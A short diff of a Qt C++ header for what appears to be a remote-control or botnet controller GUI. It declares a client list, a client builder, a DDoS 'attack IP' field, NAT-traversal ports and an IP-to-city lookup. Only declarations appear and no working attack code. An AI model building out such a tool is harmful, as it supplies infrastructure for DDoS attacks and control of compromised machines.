@@ -29,6 +29,9 @@
 #include <QFileDialog>
 #include <QMessageBox>
 #include <QSoundEffect>
+#include <QtNetwork>
+#include <QRegExp>
+#include <QTextCodec>
 namespace Ui {
 class Widget;
 }
@@ -45,7 +48,8 @@ private:
     QTableWidget *mClientTable; // 客户列表
     QMenu *mPopupMenu;          // 弹出菜单
     ZeroServer *mZeroServer;    // 服务端
-    QLineEdit *mEditPort;       // 端口设置
+    QLineEdit *mEditPort;       // 发送端口设置
+    QLineEdit *mEditPort2;      //接收端口(用于内网穿透，默认相同)
     QPushButton *mBtStartServer;    // 开启服务器
     QLineEdit *mEditDomain;     // 域名设置
     QLineEdit *mEditDdos;     // 攻击IP设置
@@ -75,6 +79,9 @@ public slots:
 
     // 创建客户端
     void createClient();
+
+    //查询并返回ip所在城市
+    QString ipLocation(QString ip);
 
 protected:
     // 事件过滤
